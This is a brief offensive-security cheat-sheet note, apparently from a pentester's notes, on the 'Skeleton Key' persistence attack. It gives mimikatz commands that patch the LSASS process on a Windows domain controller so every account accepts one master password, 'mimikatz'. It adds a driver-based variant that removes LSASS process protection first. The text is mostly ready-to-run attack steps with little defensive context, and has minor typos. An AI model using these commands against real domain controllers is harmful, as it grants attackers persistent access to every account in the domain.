#mimikatz 
- Persistence technique where it is possible to path the DC's `lssass` process so that it allows access as any user with a single password.
- Discovered by Dell Secureworks.
- Using mimikatz to inject skeleton key
```powershell
privilege::debug # 200 OK
misc::skeleton
# Any resource can be accessed by it's username and password as "mimikatz"
```
- In case the lssass.exe process in running as a protected process, we need to use the mimidriv.sys (mimikatz driver) to use skeleton key:
```powershell
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
# NOTE: The above process is noisy in logs
```